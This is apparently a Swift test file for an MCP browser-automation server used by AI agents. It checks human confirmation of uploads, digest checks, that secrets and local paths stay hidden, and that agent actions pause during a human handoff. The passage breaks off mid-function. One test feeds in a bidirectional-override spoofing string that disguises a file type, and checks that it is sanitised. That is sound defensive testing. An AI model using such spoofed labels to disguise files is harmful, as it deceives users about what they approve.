import CryptoKit
import Foundation
import Testing
import WebKitUIMCPCore
import WebKitUIMCPRuntime

@testable import WebKitUIMCPServer

private final class TransactionLedgerFactoryProbe: @unchecked Sendable {
  private let lock = NSLock()
  private var creationCount = 0

  func recordCreation() {
    lock.withLock { creationCount += 1 }
  }

  func count() -> Int {
    lock.withLock { creationCount }
  }
}

@MainActor
private final class InProcessSyntheticBrokerStub: CredentialBrokerFilling {
  static let username = "synthetic-user@example.test"
  static let password = "SP-MVP0-synthetic-only-7f3a"
  static let rotatedPassword = "SP-ROTATION-synthetic-only-8g4b"

  func fill(
    binding: CredentialSinkFormBinding,
    runtime: WebKitRuntime
  ) async throws -> CredentialBrokerWireReceipt {
    _ = try await runtime.performCredentialFill(
      binding: binding,
      username: CredentialSecretBuffer(copying: Array(Self.username.utf8)),
      password: CredentialSecretBuffer(copying: Array(Self.password.utf8))
    )
    return CredentialBrokerWireReceipt(status: .filled)
  }

  func rotatePassword(
    binding: CredentialSinkRotationBinding,
    runtime: WebKitRuntime
  ) async throws -> CredentialBrokerWireReceipt {
    _ = try await runtime.performCredentialRotationFill(
      binding: binding,
      currentPassword: CredentialSecretBuffer(copying: Array(Self.password.utf8)),
      newPassword: CredentialSecretBuffer(copying: Array(Self.rotatedPassword.utf8))
    )
    return CredentialBrokerWireReceipt(status: .changed)
  }
}

@MainActor
private final class FixedStatusCredentialBrokerStub: CredentialBrokerFilling {
  let status: CredentialBrokerWireStatus

  init(status: CredentialBrokerWireStatus) {
    self.status = status
  }

  func fill(
    binding: CredentialSinkFormBinding,
    runtime: WebKitRuntime
  ) async throws -> CredentialBrokerWireReceipt {
    _ = binding
    _ = runtime
    return CredentialBrokerWireReceipt(status: status)
  }
}

@MainActor
private final class ConfirmationPresenterStub: BrowserConfirmationPresenting {
  private(set) var requests: [(title: String, message: String, approveLabel: String)] = []
  private var responses: [Bool]
  var state: NativeConfirmationState = .idle

  init(responses: [Bool], state: NativeConfirmationState = .idle) {
    self.responses = responses
    self.state = state
  }

  func confirm(title: String, message: String, approveLabel: String) async
    -> NativeConfirmationOutcome
  {
    requests.append((title, message, approveLabel))
    return responses.isEmpty || !responses.removeFirst() ? .declined : .approved
  }

  func cancel() { state = .idle }
}

@MainActor
private final class SafariCompatibilityPresenterStub: SafariCompatibilityPresenting {
  private(set) var openedURLs: [URL] = []
  let succeeds: Bool

  init(succeeds: Bool = true) {
    self.succeeds = succeeds
  }

  func openPrivateAuthenticationURL(_ url: URL) async -> Bool {
    openedURLs.append(url)
    return succeeds
  }
}

/// A panel is opened by the page on its own schedule, and the page's script only
/// resumes once the panel is answered. Both waits are bounded so a panel that never
/// arrives, or an answer that never reaches the site, fails a test instead of hanging
/// the bundle with no `Test run with` summary.
@MainActor
private func awaitPendingDialogID(on runtime: WebKitRuntime, polls: Int = 200) async -> String? {
  for _ in 0..<polls {
    if let dialog = runtime.pendingJavaScriptDialog() { return dialog.dialogID }
    try? await Task.sleep(for: .milliseconds(20))
  }
  return nil
}

@MainActor
private func awaitPageDialogAnswer(on runtime: WebKitRuntime, polls: Int = 200) async -> Any? {
  for _ in 0..<polls {
    if let answer = try? await runtime.webView.evaluateJavaScript(
      "window.__answer === undefined ? null : window.__answer"), !(answer is NSNull)
    {
      return answer
    }
    try? await Task.sleep(for: .milliseconds(20))
  }
  return nil
}

@Suite("MCP 2026-07-28 wire server", .serialized)
@MainActor
struct MCPServerTests {
  @Test("A shared transaction ledger factory returns one authority per scope")
  func sharedTransactionLedgerFactory() throws {
    let probe = TransactionLedgerFactoryProbe()
    let factory = WebKitTransactionLedgerFactory.shared { _ in
      probe.recordCreation()
      return .init()
    }

    let first = try factory.make(scope: "default")
    let second = try factory.make(scope: "default")
    let other = try factory.make(scope: "other")

    #expect(first === second)
    #expect(first !== other)
    #expect(probe.count() == 2)
  }

  @Test("Tool calls append privacy-safe activity events")
  func toolCallActivityLog() async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      "webkitui-server-activity-\(UUID().uuidString)",
      isDirectory: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let activityLog = try WebKitActivityLog(directoryURL: directory)
    let server = try WebKitMCPServer(activityLog: activityLog)

    _ = try await call(
      server,
      id: 1,
      method: "tools/call",
      params: .object([
        "name": .string("browser_session"),
        "arguments": .object(["operation": .string("profiles")]),
      ]),
      modern: true
    )
    _ = try await call(
      server,
      id: 2,
      method: "tools/call",
      params: .object([
        "name": .string("secret-tool-name"),
        "arguments": .object([:]),
      ]),
      modern: true
    )

    let events = try await activityLog.events()
    #expect(events.count == 2)
    #expect(events.contains { $0.toolName == "browser_session" && $0.outcome == .succeeded })
    #expect(events.contains { $0.toolName == "unknown" && $0.outcome == .failed })
    let exported = String(decoding: try await activityLog.exportData(), as: UTF8.self)
    #expect(!exported.contains("secret-tool-name"))
  }

  @Test("Native confirmation helper failures deny authority")
  func nativeConfirmationHelperFailClosed() async throws {
    let helperDirectory = FileManager.default.temporaryDirectory.appendingPathComponent(
      "webkitui-confirm-test-\(UUID().uuidString)",
      isDirectory: true)
    try FileManager.default.createDirectory(
      at: helperDirectory,
      withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: helperDirectory) }
    let acceptingHelper = helperDirectory.appendingPathComponent("accepting-helper")
    try Data("#!/bin/sh\n/bin/cat >/dev/null\n".utf8).write(to: acceptingHelper)
    try FileManager.default.setAttributes(
      [.posixPermissions: 0o700],
      ofItemAtPath: acceptingHelper.path)
    let blockingHelper = helperDirectory.appendingPathComponent("blocking-helper")
    try Data("#!/bin/sh\n/bin/cat >/dev/null\n/bin/sleep 5\n".utf8).write(to: blockingHelper)
    try FileManager.default.setAttributes(
      [.posixPermissions: 0o700],
      ofItemAtPath: blockingHelper.path)

    let accepts = NativeBrowserConfirmationPresenter(
      helperURL: acceptingHelper,
      helperVerification: { _ in true },
      runningHelperVerification: { _ in true })
    let rejects = NativeBrowserConfirmationPresenter(
      helperURL: URL(fileURLWithPath: "/usr/bin/false"),
      helperVerification: { _ in true },
      runningHelperVerification: { _ in true })
    let missing = NativeBrowserConfirmationPresenter(
      helperURL: URL(fileURLWithPath: "/path/does/not/exist"),
      helperVerification: { _ in true },
      runningHelperVerification: { _ in true })
    let runningSubstitution = NativeBrowserConfirmationPresenter(
      helperURL: acceptingHelper,
      helperVerification: { _ in true },
      runningHelperVerification: { _ in false })
    let foreignSignedHelper = NativeBrowserConfirmationPresenter(
      helperURL: URL(fileURLWithPath: "/usr/bin/true"))
    let timesOut = NativeBrowserConfirmationPresenter(
      helperURL: blockingHelper,
      helperVerification: { _ in true },
      runningHelperVerification: { _ in true },
      timeout: .milliseconds(50))
    let cancels = NativeBrowserConfirmationPresenter(
      helperURL: blockingHelper,
      helperVerification: { _ in true },
      runningHelperVerification: { _ in true },
      timeout: .seconds(5))

    #expect(
      await accepts.confirm(title: "Title", message: "Message", approveLabel: "Approve")
        == .approved)
    #expect(
      await rejects.confirm(title: "Title", message: "Message", approveLabel: "Approve")
        != .approved)
    #expect(
      await missing.confirm(title: "Title", message: "Message", approveLabel: "Approve")
        != .approved)
    #expect(
      await runningSubstitution.confirm(title: "Title", message: "Message", approveLabel: "Approve")
        != .approved)
    #expect(
      await foreignSignedHelper.confirm(title: "Title", message: "Message", approveLabel: "Approve")
        != .approved)
    #expect(
      await timesOut.confirm(title: "Title", message: "Message", approveLabel: "Approve")
        == .timedOut)
    let pending = Task {
      await cancels.confirm(title: "Title", message: "Message", approveLabel: "Approve")
    }
    for _ in 0..<50 {
      if cancels.state == .pending { break }
      try await Task.sleep(for: .milliseconds(10))
    }
    #expect(cancels.state == .pending)
    cancels.cancel()
    #expect(await pending.value == .cancelled)
    #expect(cancels.state == .idle)
  }

  @Test("A helper closing standard input fails without terminating the server")
  func nativeConfirmationBrokenPipeFailsClosed() throws {
    let pipe = Pipe()
    try pipe.fileHandleForReading.close()
    defer { try? pipe.fileHandleForWriting.close() }

    var rejectedBrokenPipe = false
    do {
      try NativeBrowserConfirmationPresenter.writePayload(
        Data("synthetic request".utf8),
        to: pipe.fileHandleForWriting)
    } catch {
      rejectedBrokenPipe = true
    }

    #expect(rejectedBrokenPipe)
  }

  @Test("Native confirmation arguments never carry the approval payload")
  func nativeConfirmationPayloadUsesStandardInput() {
    #expect(
      NativeBrowserConfirmationPresenter.helperArguments == [
        "--protocol-version", "1", "--request-stdin",
      ])
    #expect(!NativeBrowserConfirmationPresenter.helperArguments.joined().contains("Message"))
  }

  @Test("Native confirmation strips bidirectional and control spoofing")
  func nativeConfirmationSanitizesUntrustedLabels() {
    let spoofed = "safe\u{202E}txt.exe\u{2066}\nnext"
    #expect(WebKitMCPServer.safeConfirmationText(spoofed) == "safetxt.exenext")
  }

  @Test("Discovery advertises stateless modern protocol metadata")
  func discovery() async throws {
    let server = try WebKitMCPServer()
    let response = try await call(
      server,
      id: 1,
      method: "server/discover",
      params: .object([:]),
      modern: true
    )

    let result = try object(response["result"])
    #expect(result["resultType"] == .string("complete"))
    #expect(
      result["supportedVersions"]
        == .array([.string("2026-07-28")])
    )
    #expect(try object(result["_meta"])["io.modelcontextprotocol/serverInfo"] != nil)
  }

  @Test("Modern requests require metadata and reject unsupported revisions")
  func modernMetadataValidation() async throws {
    let server = try WebKitMCPServer()
    let missing = try await call(
      server,
      id: 1,
      method: "server/discover",
      params: .object([:]),
      modern: false
    )
    #expect(try object(missing["error"])["code"] == .int(-32602))

    let unsupported = try await rawCall(
      server,
      id: 2,
      method: "tools/list",
      params: .object([
        "_meta": .object([
          "io.modelcontextprotocol/protocolVersion": .string("2026-08-01"),
          "io.modelcontextprotocol/clientCapabilities": .object([:]),
        ])
      ])
    )
    let error = try object(unsupported["error"])
    #expect(error["code"] == .int(-32022))
    let data = try object(error["data"])
    #expect(data["supported"] == .array([.string("2026-07-28")]))
    #expect(data["requested"] == .string("2026-08-01"))
  }

  @Test("Tool list is deterministic, bounded and cacheable")
  func toolList() async throws {
    let server = try WebKitMCPServer()
    let first = try await call(
      server,
      id: 1,
      method: "tools/list",
      params: .object([:]),
      modern: true
    )
    let second = try await call(
      server,
      id: 2,
      method: "tools/list",
      params: .object([:]),
      modern: true
    )
    let firstResult = try object(first["result"])
    let secondResult = try object(second["result"])
    #expect(firstResult["tools"] == secondResult["tools"])
    #expect(firstResult["ttlMs"] == .int(300_000))

    let names = try array(firstResult["tools"]).map {
      try string(object($0)["name"])
    }
    #expect(
      names == [
        "browser_download",
        "browser_upload",
        "browser_act",
        "browser_capture",
        "browser_fill_siliconpass",
        "browser_rotate_siliconpass_password",
        "browser_navigate",
        "browser_observe",
        "browser_read_text",
        "browser_inspect_element",
        "browser_scroll",
        "element_scroll_into_view",
        "browser_session",
        "browser_transaction",
      ]
    )
    let downloadTool = try object(try array(firstResult["tools"])[0])
    let schema = try object(downloadTool["inputSchema"])
    #expect(
      schema["required"]
        == .array([.string("session_id"), .string("idempotency_key")]))
    let properties = try object(schema["properties"])
    #expect(properties["url"] != nil)
    #expect(properties["expected_provisioning_profile_uuid"] != nil)
  }

  @Test("Upload attaches a confirmed local file and proves its preview postcondition")
  func uploadAttachesConfirmedLocalFile() async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      UUID().uuidString, isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let file = directory.appendingPathComponent("feature-graphic.png")
    let bytes = Data("play-feature-graphic-fixture".utf8)
    try bytes.write(to: file, options: .atomic)
    let digest = SHA256.hash(data: bytes).map { String(format: "%02x", $0) }.joined()

    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <h1>No asset</h1>
      <input aria-label="Feature graphic" type="file"
        onchange="document.querySelector('h1').textContent = 'Uploaded ' + this.files[0].name">
      """,
      baseURL: URL(string: "https://play.fixture.invalid/listing")!,
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)

    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let observationID = try string(observation["observationID"])
    let elementID = try fileControlID(in: observation, labelled: "Feature graphic")

    let response = try await toolCall(
      server, id: 2, name: "browser_upload",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("play-feature-graphic-01"),
        "observation_id": .string(observationID),
        "element_id": .string(elementID),
        "file_paths": .array([.string(file.path)]),
        "expected_sha256": .array([.string(digest)]),
        "postcondition": .object([
          "type": .string("heading_equals"),
          "value": .string("Uploaded feature-graphic.png"),
        ]),
      ])

    let result = try object(response["result"])
    #expect(result["isError"] != .bool(true))
    let structured = try object(result["structuredContent"])
    let receipt = try object(structured["file_upload_receipt"])
    #expect(receipt["filenames"] == .array([.string("feature-graphic.png")]))
    #expect(receipt["sha256"] == .array([.string(digest)]))
    #expect(receipt["fileCount"] == .int(1))
    #expect(receipt["selectionMode"] == .string("agent_confirmed"))
    #expect(receipt["localPathsExposed"] == .bool(false))
    #expect(structured["file_selected"] == .bool(true))

    // The confirmation must state exactly what will be sent, and never the local path.
    let request = try #require(presenter.requests.first)
    #expect(request.message.contains("feature-graphic.png"))
    #expect(request.message.contains(digest))
    #expect(request.message.contains(String(bytes.count)))
    #expect(!request.message.contains(directory.path))
    let encoded = String(decoding: try JSONEncoder().encode(result), as: UTF8.self)
    #expect(!encoded.contains(directory.path))
  }

  @Test("Upload refuses a digest that does not match the local file before confirming")
  func uploadRejectsMismatchedDigestBeforeConfirmation() async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      UUID().uuidString, isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let file = directory.appendingPathComponent("icon.png")
    try Data("real-bytes".utf8).write(to: file, options: .atomic)

    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<h1>No asset</h1><input aria-label='Icon' type='file'>",
      baseURL: URL(string: "https://play.fixture.invalid/listing")!,
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])

    let response = try await toolCall(
      server, id: 2, name: "browser_upload",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("digest-mismatch-01"),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try fileControlID(in: observation, labelled: "Icon")),
        "file_paths": .array([.string(file.path)]),
        "expected_sha256": .array([.string(String(repeating: "a", count: 64))]),
        "postcondition": .object([
          "type": .string("heading_equals"), "value": .string("Uploaded icon.png"),
        ]),
      ])
    #expect(response["error"] != nil)
    #expect(presenter.requests.isEmpty)
    #expect(!runtime.hasArmedUploadSelection())
  }

  @Test("A declined upload confirmation arms nothing and attaches nothing")
  func declinedUploadAttachesNothing() async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      UUID().uuidString, isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let file = directory.appendingPathComponent("screenshot.png")
    try Data("declined".utf8).write(to: file, options: .atomic)

    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<h1>No asset</h1><input aria-label='Screenshot' type='file'>",
      baseURL: URL(string: "https://play.fixture.invalid/listing")!,
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [false])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])

    let response = try await toolCall(
      server, id: 2, name: "browser_upload",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("declined-upload-01"),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try fileControlID(in: observation, labelled: "Screenshot")),
        "file_paths": .array([.string(file.path)]),
        "postcondition": .object([
          "type": .string("heading_equals"), "value": .string("Uploaded screenshot.png"),
        ]),
      ])
    #expect(try object(response["result"])["isError"] == .bool(true))
    #expect(presenter.requests.count == 1)
    #expect(!runtime.hasArmedUploadSelection())
    let count =
      try await runtime.webView.evaluateJavaScript(
        "document.querySelector('input').files.length") as? Int
    #expect(count == 0)
  }

  @Test("Upload requires a postcondition and a freshly observed target")
  func uploadRequiresPostconditionAndFreshTarget() async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      UUID().uuidString, isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let file = directory.appendingPathComponent("asset.png")
    try Data("asset".utf8).write(to: file, options: .atomic)

    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<h1>No asset</h1><input aria-label='Asset' type='file'>",
      baseURL: URL(string: "https://play.fixture.invalid/listing")!,
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true, true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let observationID = try string(observation["observationID"])
    let elementID = try fileControlID(in: observation, labelled: "Asset")

    let missingPostcondition = try await toolCall(
      server, id: 2, name: "browser_upload",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("no-postcondition-01"),
        "observation_id": .string(observationID),
        "element_id": .string(elementID),
        "file_paths": .array([.string(file.path)]),
      ])
    #expect(missingPostcondition["error"] != nil)

    let staleObservation = try await toolCall(
      server, id: 3, name: "browser_upload",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("stale-observation-01"),
        "observation_id": .string(UUID().uuidString),
        "element_id": .string(elementID),
        "file_paths": .array([.string(file.path)]),
        "postcondition": .object([
          "type": .string("heading_equals"), "value": .string("Uploaded asset.png"),
        ]),
      ])
    #expect(staleObservation["error"] != nil)
    #expect(presenter.requests.isEmpty)
    #expect(!runtime.hasArmedUploadSelection())
  }

  @Test("An approved selection never outlives a target that opened no file panel")
  func approvedSelectionNeverOutlivesItsTarget() async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      UUID().uuidString, isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let file = directory.appendingPathComponent("private-asset.png")
    try Data("must-not-leak".utf8).write(to: file, options: .atomic)

    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    // The approved target is a text input: clicking it opens no file panel, so the
    // approved selection has nothing to be consumed by.
    _ = try await runtime.loadHTML(
      """
      <h1>No asset</h1>
      <input aria-label="Not a file control" type="text">
      <input aria-label="Site owned" type="file">
      """,
      baseURL: URL(string: "https://play.fixture.invalid/listing")!,
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])

    _ = try await toolCall(
      server, id: 2, name: "browser_upload",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("no-panel-target-01"),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try fileControlID(in: observation, labelled: "Not a file control")),
        "file_paths": .array([.string(file.path)]),
        "postcondition": .object([
          "type": .string("heading_equals"), "value": .string("Uploaded private-asset.png"),
        ]),
      ])

    #expect(!runtime.hasArmedUploadSelection())
    // A panel the site opens afterwards must receive nothing.
    _ = try? await runtime.webView.evaluateJavaScript(
      "document.querySelectorAll('input')[1].click()")
    try await Task.sleep(for: .milliseconds(150))
    let count =
      try await runtime.webView.evaluateJavaScript(
        "document.querySelectorAll('input')[1].files.length") as? Int
    #expect(count == 0)
  }

  @Test("Session status names the origins a profile is already signed in to")
  func statusNamesAuthenticatedOrigins() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    defer { try? registry.close(handle) }
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<p>Portal</p>", baseURL: URL(string: "https://fixture.invalid/")!,
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let secret = "authenticated-origin-cookie-secret"
    let cookie = try #require(
      HTTPCookie(properties: [
        .domain: "console.fixture.invalid", .path: "/", .name: "session",
        .value: secret, .secure: "TRUE",
      ]))
    await runtime.webView.configuration.websiteDataStore.httpCookieStore.setCookie(cookie)

    let server = WebKitMCPServer(registry: registry)
    let response = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: [
        "operation": .string("status"),
        "session_id": .string(handle.rawValue.uuidString),
      ])
    let result = try object(response["result"])
    let structured = try object(result["structuredContent"])
    let origins = try array(structured["authenticated_origins"]).map { try string($0) }
    #expect(origins.contains("console.fixture.invalid"))
    let encoded = String(decoding: try JSONEncoder().encode(result), as: UTF8.self)
    #expect(!encoded.contains(secret))
  }

  @Test("A file swapped after confirmation is reported, not sent silently")
  func swappedFileAfterConfirmationIsReported() async throws {
    let sent = JSONValue.object([
      "structuredContent": .object([
        "file_upload_receipt": .object(["sha256": .array([.string("aaa"), .string("bbb")])])
      ])
    ])
    let matching = WebKitMCPServer.annotatingConfirmedDigests(sent, confirmed: ["aaa", "bbb"])
    #expect(
      try object(object(matching)["structuredContent"])["confirmed_digests_match"]
        == .string("true"))

    let swapped = WebKitMCPServer.annotatingConfirmedDigests(sent, confirmed: ["aaa", "ccc"])
    let swappedContent = try object(object(swapped)["structuredContent"])
    #expect(swappedContent["confirmed_digests_match"] == .string("false"))
    #expect(swappedContent["confirmed_digests"] == .array([.string("aaa"), .string("ccc")]))

    // No receipt at all must not read as a match.
    let none = WebKitMCPServer.annotatingConfirmedDigests(
      .object(["structuredContent": .object([:])]), confirmed: ["aaa"])
    #expect(
      try object(object(none)["structuredContent"])["confirmed_digests_match"]
        == .string("no_receipt"))
  }

  @Test("Profiles state the single host lease before any session is opened")
  func profilesStateTheHostLeaseUpFront() async throws {
    // A client could previously learn that the host allows one session only from a
    // successful open, so it could not tell contention from failure.
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    let response = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("profiles")])
    let structured = try object(try object(response["result"])["structuredContent"])
    #expect(structured["maximum_sessions"] == .int(1))
    let lease = try object(structured["host_lease"])
    #expect(lease["exclusive"] == .bool(true))
    #expect(try string(lease["state"]).count > 0)
    #expect(try string(lease["remediation"]).count > 0)
  }

  @Test("A disconnected client releases its session and the host lease")
  func disconnectedClientReleasesTheLease() async throws {
    // A per-connection server that ends without releasing leaves the session open in
    // the durable registry, holding the single host lease under a holder that names
    // the broker itself. Nothing inside MCP can then free it.
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      "webkitui-release-\(UUID().uuidString)", isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let registry = try WebKitSessionRegistry(
      enforceHostExclusiveSession: true,
      hostControllerLockURL: directory.appendingPathComponent("controller.lock"))
    let server = WebKitMCPServer(registry: registry)
    _ = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    #expect(registry.count == 1)

    await server.relinquishClientResources()
    #expect(registry.count == 0)
    #expect(registry.externalHostControllerHolder() == nil)
  }

  @Test("Download reports an active human handoff without attempting the action")
  func downloadReportsHumanControl() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<p>Portal</p>",
      baseURL: URL(string: "https://fixture.invalid/")!,
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    try runtime.requestHumanHandoff()
    try runtime.beginHumanControl(presentWindow: false)
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let response = try await toolCall(
      server,
      id: 1,
      name: "browser_download",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("download-during-handoff"),
        "url": .string("https://fixture.invalid/profile"),
      ])
    let result = try object(response["result"])
    #expect(result["isError"] == .bool(true))
    let structured = try object(result["structuredContent"])
    #expect(structured["status"] == .string("human_control_active"))
    #expect(structured["control_state"] == .string("human_controlled"))
    #expect(structured["download_started"] == .bool(false))
    #expect(structured["resume_required"] == .bool(true))
    #expect(presenter.requests.isEmpty)
  }

  @Test("Page scrolling, element scrolling, and virtual text reads are bounded")
  func scrollingAndTextReading() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    let opened = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(opened["result"])["structuredContent"])["session_id"])
    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    _ = try await runtime.loadHTML(
      """
      <div role='log' aria-label='Build log' style='height:80px;overflow:auto'>
        <pre>line one\nline two\nline three</pre>
      </div>
      <div style='height:1600px'></div>
      <button aria-label='Bottom action'>Bottom</button>
      """,
      baseURL: URL(string: "https://fixture.invalid/scroll"),
      timeout: .seconds(5), quietWindow: .milliseconds(40))

    let textRead = try await toolCall(
      server, id: 2, name: "browser_read_text",
      arguments: ["session_id": .string(sessionID), "maximum_characters": .int(2_000)])
    let text = try object(try object(textRead["result"])["structuredContent"])
    #expect(try string(text["bodyText"]).contains("line one"))
    #expect(!(try array(text["regions"])).isEmpty)

    let observed = try await toolCall(
      server, id: 3, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let elements = try array(observation["elements"])
    let bottom = try #require(elements.last)
    let elementID = try string(try object(bottom)["elementID"])
    let elementScroll = try await toolCall(
      server, id: 4, name: "element_scroll_into_view",
      arguments: [
        "session_id": .string(sessionID),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(elementID),
      ])
    let elementScrollResult = try object(
      try object(elementScroll["result"])["structuredContent"])
    #expect(elementScrollResult["observationInvalidated"] == .bool(true))

    let pageScroll = try await toolCall(
      server, id: 5, name: "browser_scroll",
      arguments: ["session_id": .string(sessionID), "delta_y": .int(-500)])
    let pageScrollResult = try object(try object(pageScroll["result"])["structuredContent"])
    #expect(pageScrollResult["observationInvalidated"] == .bool(true))
  }

  @Test("Observation pagination and semantic field budgets are server enforced")
  func boundedObservationPages() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    let opened = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(opened["result"])["structuredContent"])["session_id"])
    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    _ = try await runtime.loadHTML(
      """
      <button aria-label="First action with a deliberately long accessible name">First</button>
      <button aria-label="Second action with a deliberately long accessible name">Second</button>
      <button aria-label="Third action with a deliberately long accessible name">Third</button>
      """,
      baseURL: URL(string: "https://fixture.invalid/observation-pages"),
      timeout: .seconds(3), quietWindow: .milliseconds(40))

    let firstPage = try await toolCall(
      server, id: 2, name: "browser_observe",
      arguments: [
        "session_id": .string(sessionID),
        "maximum_elements": .int(1),
        "maximum_field_characters": .int(64),
      ])
    let first = try object(try object(firstPage["result"])["structuredContent"])
    #expect(first["totalElementCount"] == .int(3))
    #expect(first["elementOffset"] == .int(0))
    #expect(first["nextElementOffset"] == .int(1))
    #expect((try array(first["elements"])).count == 1)

    let finalPage = try await toolCall(
      server, id: 3, name: "browser_observe",
      arguments: [
        "session_id": .string(sessionID),
        "maximum_elements": .int(2),
        "element_offset": .int(2),
        "maximum_field_characters": .int(64),
      ])
    let final = try object(try object(finalPage["result"])["structuredContent"])
    #expect(final["elementOffset"] == .int(2))
    #expect(final["nextElementOffset"] == nil)
    #expect((try array(final["elements"])).count == 1)
  }

  @Test("Default observation pages remain within the one mebibyte wire budget")
  func defaultObservationWireBudget() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    let opened = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(opened["result"])["structuredContent"])["session_id"])
    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    let longName = String(repeating: "bounded semantic field ", count: 40)
    let markup = (0..<300).map { index in
      "<button aria-label='\(longName)\(index)'>Action \(index)</button>"
    }.joined()
    _ = try await runtime.loadHTML(
      markup,
